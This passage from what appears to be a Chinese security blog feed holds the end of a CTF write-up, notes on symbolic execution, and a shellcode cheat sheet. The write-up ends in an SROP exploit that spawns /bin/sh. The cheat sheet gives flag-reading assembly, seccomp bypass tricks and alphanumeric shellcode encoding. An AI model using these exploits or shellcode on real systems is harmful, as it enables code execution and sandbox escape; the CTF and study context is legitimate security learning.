bin_sh_addr</span><br><span class="line">sigframe.rsi = 0</span><br><span class="line">sigframe.rdx = 0</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line"></span><br><span class="line">payload += bytes(sigframe)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x0c">0x0C</h1>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/2023/09/30/Symbolic%20Execution%20Leaning%20Note%20(1)%20--%20Basis/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第一步——
</blockquote>
<span id="more"></span>
<h1 id="x00-基本模型">0x00 基本模型</h1>
<ul>
<li><p><strong>概述</strong><br />
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure> 调用<span
class="math inline">\(sum(1,2)\)</span>，学过C语言的都知道会发生什么事情<br />
但如果我调用<span
class="math inline">\(sum(a1,a2)\)</span>，并且我在这之前并未声明a1，a2呢？<br />
先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic
Execution)</strong>，具体会发生什么我们接着往下看</p></li>
<li><p><strong>基本思想</strong></p>
<ol type="1">
<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示
<ol type="1">
<li>符号变量是什么？
<ol type="1">
<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e.
程序的一次具体执行可以视为符号执行的一次实例）</li>
</ol></li>
<li>操作数是什么？</li>
</ol></li>
<li>对于任意程序，其执行流程是由执行序列的执行语义控制的
<ol type="1">
<li>执行语义：
<ol type="1">
<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
<li>条件语句对程序执行流程的控制</li>
</ol></li>
</ol></li>
<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
</ol></li>
<li><p><strong>程序语言定义</strong></p>
<ol type="1">
<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：
<ol type="1">
<li>理想模型中程序只处理“有符号整数”</li>
<li>程序“执行数”规模有限</li>
<li>可以处理程序内所有if条件语句的约束表达式</li>
</ol></li>
<li>基于符号执行技术的理想场景，对程序语言做如下定义
<ol type="1">
<li>程序变量类型：只包含“有符号整数”</li>
<li>程序语句类型
<ol type="1">
<li>简单声明语句，如<code>a = 3</code></li>
<li>if条件语句(包括then 和 else)</li>
<li>无条件跳转语句，如goto语句</li>
<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
</ol></li>
<li>程序语义
<ol type="1">
<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>程序执行状态</strong></p>
<ul>
<li>PC
<ol type="1">
<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件
pc(path
constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
<li>来看一段示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>假设上述三个分支中选择了if1:true if2:true
if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
</ol></li>
<li>符号执行引擎
<ul>
<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含
~q（2），如果符号执行引擎选择进入then分支，则 pc
表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc
表现为（2）的形式</li>
<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
</ul></li>
</ul></li>
<li><p><strong>符号执行树</strong></p>
<ol type="1">
<li>定义：用来描述程序执行路径的树形结构</li>
<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)
<img
src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
</ol></li>
<li><p><strong>约束求解</strong></p>
<ol type="1">
<li>定义：
<ol type="1">
<li>给定一个三元组&lt;V,D,C&gt;,其中：
<ol type="1">
<li>V: 变量的有限集合<br />
</li>
<li>D: 变量的论域，变量可能取值的有限集合<br />
</li>
<li>C: 有限约束集合，某个约束关系<span
class="math inline">\(C_i\)</span>包含V中一个或多个变量，若<span
class="math inline">\(C_i\)</span>包含k个变量，则称其为在这k个变量集合上的k元约束<br />
</li>
</ol></li>
<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件<br />
</li>
<li>对于约束问题<span class="math inline">\(P =
&lt;V,D,C&gt;\)</span>，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的<br />
</li>
</ol></li>
<li>分类:
<ol type="1">
<li>SAT(The Satisfiability problem, 可满足性问题)
<ol type="1">
<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1<br />
</li>
<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂<br />
</li>
</ol></li>
<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)
<ol type="1">
<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。
<ol type="1">
<li>什么是一阶逻辑</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>回到开始的函数</strong></p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>我们将其写为<em>类PL/1语言</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>我们在调用<span
class="math inline">\(sum(1,2)\)</span>后，可以列一个表格来观察程序流<br />
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
\end{array}
\]</span> &gt; Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
<p>我们在调用<span
class="math inline">\(sum(a1,a2)\)</span>后，就是把具体值换成了对应的符号
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<blockquote>
<p>Line 5是return (a1+a2)</p>
</blockquote>
<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>这个函数转化为C就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">power</span><span class="params">(<span class="type">int</span> X, <span class="type">int</span> Y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> Z = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> J = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续用表格的格式来看</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<p>前三行都很正常，直到第五行进行判断<br />
1. 处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code>
2. 生成两个分支的路径约束条件：<br />
- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
两个路径约束都可满足，分别对两个路径进行探索</p>
<p>对于分支: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
<p>对于分支: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后因为Line
9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
<h1 id="x01-动态符号执行技术dse">0x01 动态符号执行技术(DSE)</h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：
<ol type="1">
<li>用符号执行技术对路径进行分析</li>
<li>提取路径的约束表达式</li>
<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
<li>求解变形后的表达式并生成新的测试用例</li>
<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
</ol></li>
<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
</ol></li>
<li><strong>实现细节(以函数为例)</strong>
<ol type="1">
<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
<li>Step1: 生成一组随机输入，开始"实际执行"</li>
<li>Step2:
<strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
<li>Step3:
根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束
<ul>
<li>举个例子：深度优先策略</li>
<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>,
深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
</ul></li>
<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
<li>Step5: 重复上述过程，直到遍历全部路径</li>
</ol></li>
<li><strong>DSE工具SAGE</strong>
<ol type="1">
<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
<li>SAGE基于x86的机器码进行符号执行，原因如下：
<ol type="1">
<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
<li>忽略编译器"代码优化""代码混淆""基本块转换"等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
<li>闭源分析yyds</li>
</ol></li>
</ol></li>
<li><strong>关键问题</strong>
<ol type="1">
<li>外部函数调用</li>
<li>循环问题：路径爆炸</li>
</ol></li>
</ul>
<blockquote>
<p>这一段也不仔细读了...用到再学</p>
</blockquote>
<h1 id="x02-并行符号执行技术pse">0x02
<strong>并行符号执行技术(PSE)</strong></h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
<li>分布式...这我就先不看了</li>
</ol></li>
</ul>
<h1 id="x03-参考文献">0x03 参考文献</h1>
<p>1《软件安全分析与应用》</p>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Shellcode Summary</title>
    <url>/2024/02/08/Pwn%20-%20Shellcode%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Shellcode 也是十分核心的技术🤔
</blockquote>
<span id="more"></span>
<h1 id="manual">Manual</h1>
<p><a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">linux
系统调用号表</a></p>
<p><a href="https://docs.pwntools.com/en/stable/shellcraft.html">manual:
pwntools.shellcraft</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-编写-shellcode">编写 shellcode</a>
<ul>
<li><a href="#1-1-shellcode-板子">shellcode 板子</a></li>
<li><a href="#1-2-现有工具">现有工具</a></li>
<li><a href="#1-3-板子">板子</a></li>
</ul></li>
<li><a href="#2-shellcode-restrictions--bypass-限制与绕过">shellcode
restrictions &amp; bypass (限制与绕过)</a>
<ul>
<li><a href="#2-1-length-restrictions-长度约束">Length restrictions
(长度约束)</a></li>
<li><a href="#2-2-seccomp-禁用">seccomp 禁用</a></li>
<li><a href="#2-3-alphanumeric-shellcode-字母数字构成">alphanumeric
shellcode (字母+数字构成)</a></li>
</ul></li>
<li><a href="#3-例题">例题</a></li>
<li><a href="#4-参考资料">参考资料</a></li>
</ol>
<h1 id="编写-shellcode">[1] 编写 shellcode</h1>
<h2 id="shellcode-板子">[1-1] shellcode 板子</h2>
<ol type="1">
<li><p><a href="https://www.exploit-db.com/">exploit-db</a></p></li>
<li><p><a href="https://shell-storm.org/shellcode/index.html">Shellcodes
database for study cases(已停止更新)</a></p>
<ul>
<li>这个虽然停更了但是挺好用的，很适合找一些 length restrictions 的
shellcode</li>
</ul></li>
</ol>
<h2 id="现有工具">[1-2] 现有工具</h2>
<h3 id="pwntools">[1-2-1] Pwntools</h3>
<h4 id="shellcraft">[1-2-1-1] shellcraft</h4>
<ul>
<li><p><a
href="https://docs.pwntools.com/en/stable/shellcraft.html">Manual</a></p></li>
<li><p>速成 (更多请 RTFM 或查看 [1-3] ) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arch: i386 / amd64</span></span><br><span class="line"><span class="comment"># os: linux</span></span><br><span class="line"><span class="comment"># func: open / read / write / mmap</span></span><br><span class="line">shellcode = shellcraft.arch.os.func(args)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h4 id="asm">[1-2-1-2] asm</h4>
<ul>
<li>定义: <code>def asm(str) -&gt; bytes</code></li>
</ul>
<h2 id="板子">[1-3] 板子</h2>
<ol type="1">
<li><p>常用 shellcraft</p>
<p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;)</span></span><br><span class="line">shellcode_open = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.read(<span class="number">0</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># 其他用法: shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.write(<span class="number">1</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(addr,len,prot,flags,fd,offset)</span></span><br><span class="line">shellcode_mmap = shellcraft.mmap(<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>不用堆栈的 <code>orw</code>，字符串"flag"需要提前布置好.
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x2333008     # 指向&quot;flag\x00\x00\x00\x00&quot;的指针</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall               # open(&#x27;./flag&#x27;)</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov rdi,3             # fd = 3</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall               # read(3,0x2333100,0x50)</span></span><br><span class="line"><span class="string">mov rdi,1             # stdin = 1</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall               # write(1,0x2333100,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="在线网站">[1-4] 在线网站</h2>
<ol type="1">
<li><p><a href="defuse.ca">Online x86 and x64 Intel Instruction
Assembler</a>: 在线编写 shellcode 和反汇编 shellcode，目前只支持
x86/x64</p></li>
<li><p><a href="shell-storm.org">Online Assembler and Disassembler</a>:
另一个更全的在线编写 shellcode 和反汇编 shellcode 网站</p></li>
<li><p><a href="shell-storm.org">Shellcodes database for study
cases</a>: shellcode 数据库，支持很多指令集与操作系统</p></li>
<li><p><a href="exploit-db.com">Exploit Database Shellcodes</a>: 另一个
shellcode 数据库</p></li>
<li><p><a href="revshells.com">Online - Reverse Shell Generator</a>:
生成反弹 shell 的命令</p></li>
</ol>
<h2 id="手搓-shellcode">[1-5] 手搓 shellcode</h2>
<p>传参顺序: rdi,rsi,rdx,rcx,r8,r9</p>
<p>存<a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用号</a>的寄存器:
rax</p>
<h2 id="c-代码提取-shellcode">[1-6] C 代码提取 shellcode</h2>
<p><a href="https://www.jianshu.com/p/5d1b1eafca21">看这篇</a></p>
<h1 id="shellcode-restrictions-bypass-限制与绕过">[2] shellcode
restrictions &amp; bypass (限制与绕过)</h1>
<h2 id="length-restrictions-长度约束">[2-1] Length restrictions
(长度约束)</h2>
<h3 id="restriction">[2-1-1] restriction</h3>
<p>shellcode 限制在 xx bytes 以内</p>
<h3 id="bypass1---压缩-shellcode">[2-1-2] bypass1 - 压缩 shellcode</h3>
<ol start="0" type="1">
<li><p>构造一次 SYS_read 再去读一遍 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xchg rdi,rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\xeb\xf6&#x27;</span></span><br></pre></td></tr></table></figure> 上述 shellcode 只有
0x10 大小，</p></li>
<li><p>可以去 <a
href="https://shell-storm.org/shellcode/index.html">Shellcodes database
for study cases(已停止更新)</a> 找比较小的 shellcode</p></li>
<li><p>常用压缩方式</p>
<ol type="1">
<li><p>⚠ 观察 <code>寄存器 + 栈</code> 的状态</p></li>
<li><p>长寄存器改为短寄存器 <code>rax(8bytes)</code> -&gt;
<code>eax(4bytes)</code> -&gt; <code>ax(2bytes)</code> -&gt;
<code>ah/al(1byte)</code></p></li>
<li><p>置零</p>
<ol type="1">
<li><p><code>mov reg, 0</code> -&gt; <code>xor reg, reg</code></p></li>
<li><p>多用 <code>push / pop</code></p></li>
<li><p>多用 <code>cdq</code> 来将 <code>rdx</code> 置零</p></li>
<li><p>多用 <code>xchg</code> 交换 <code>reg1</code> 和
<code>reg2</code></p>
<ul>
<li>观察执行 shellcode 时的
context（上下文），用上下文的一些寄存器来初始化</li>
</ul></li>
</ol></li>
</ol></li>
<li><p>没什么用的积累 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edx,7   ---&gt;   cdq; mov dl,7</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="bypass2---二次-read">[2-1-3] bypass2 - 二次 read</h3>
<h2 id="seccomp-禁用">[2-2] seccomp 禁用</h2>
<h3 id="restriction-1">[2-2-1] restriction</h3>
<p>程序调用 <code>seccomp</code> 或 <code>prctl</code>
禁用了某些系统调用</p>
<blockquote>
<p>本质是沙盒逃逸，后续打算这里只留下常用的汇编语句或者shellcraft语法，原理挪到
<a href="">Pwn - Sandbox Escape Summary</a> 中去</p>
</blockquote>
<h3 id="bypass">[2-2-2] bypass</h3>
<blockquote>
<p>本质是对 IO stream
的汇编考察，学习这一部分应当积累足够多的相关知识。</p>
</blockquote>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<h4 id="open">open</h4>
<h4 id="read">read</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPT 有关 read 的拓展</span><br><span class="line"></span><br><span class="line">如果 `read`、`pread64` 和 `readv` 等系统调用被禁用了，你可能可以考虑使用其他的系统调用来读取文件。以下是一些可能的替代方案：</span><br><span class="line"></span><br><span class="line">1. **mmap**: 使用 `mmap` 系统调用映射文件到内存中，然后通过内存访问来读取文件内容。</span><br><span class="line"></span><br><span class="line">2. **open + read**: 可以使用 `open` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">3. **fopen + fread**: 使用标准 C 库函数 `fopen` 和 `fread` 来打开和读取文件内容。</span><br><span class="line"></span><br><span class="line">4. **openat + read**: 使用 `openat` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">5. **pipe + fork + exec**: 创建一个管道，在子进程中执行命令来读取文件内容，父进程通过管道读取子进程的输出。</span><br><span class="line"></span><br><span class="line">6. **recv + recvfrom**: 如果你可以通过网络传输文件，你可以使用 `recv` 或 `recvfrom` 等网络套接字函数来接收文件数据。</span><br><span class="line"></span><br><span class="line">7. **其他文件操作函数**: 还有一些其他的文件操作函数，比如 `lseek` 可以用于移动文件指针，`preadv` 可以用于原子地读取多个文件描述符指定的文件内容等。</span><br><span class="line"></span><br><span class="line">要选择合适的替代方案，需要考虑到具体的情况和环境限制。</span><br></pre></td></tr></table></figure>
<h4 id="write">write</h4>
<h4 id="废弃待整理">废弃，待整理</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 `seccomp-tools dump ./pwn` 来查看 elf 文件被禁用了哪些调用</span><br><span class="line"></span><br><span class="line">#### [2-2-2-1] 禁用 `execve`</span><br><span class="line"></span><br><span class="line">- bypass: orw</span><br><span class="line"></span><br><span class="line">#### [2-2-2-2] OR 没有 W ( prctl 禁用 `open` 但不禁用 `fstat`)</span><br><span class="line"></span><br><span class="line">&gt; 注：由于下面的绕过方式需要在64位与32位之间切换，所以建议不要在 exp 开头设置 `context(arch=&#x27;i386/amd64&#x27;)` ，而是选择 `asm(shellcode,arch=&#x27;i386/amd64&#x27;)`</span><br><span class="line"></span><br><span class="line">- bypass: 由于64位下 `fstat` 函数的调用号为 5，而在32位中 `open` 的系统调用号为 5，所以我们可以利用 `retfq` 切换到 32 位执行 `open`</span><br></pre></td></tr></table></figure>
<h2 id="alphanumeric-shellcode-字母数字构成">[2-3] alphanumeric
shellcode (字母+数字构成)</h2>
<h3 id="manual-1">[2-3-1] Manual</h3>
<p><a href="https://nets.ec/Ascii_shellcode">ascii -&gt; asm
手册</a></p>
<h3 id="restriction-2">[2-3-2] restriction</h3>
<p>shellcode 只能由字母和数字组成</p>
<h3 id="shellcode-生成">[2-3-3] shellcode 生成:</h3>
<p>这种 shellcode 可以由工具 <a
href="https://github.com/SkyLined/alpha3">ALPHA3</a> 直接生成，</p>
<p>但 alpha3 的 build 有点儿麻烦，不如直接用杭电一位师傅写的 <a
href="https://github.com/veritas501/ae64">AE64</a>，</p>
<p>AE64 可以将任何 <code>AMD64</code> 架构的 shellcode 转换为
alphanumeric shellcode</p>
<h3 id="示例">[2-3-4] 示例：</h3>
<blockquote>
<p>AE64 在 github 的 README 有更详细的介绍</p>
</blockquote>
<p>简单示例 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
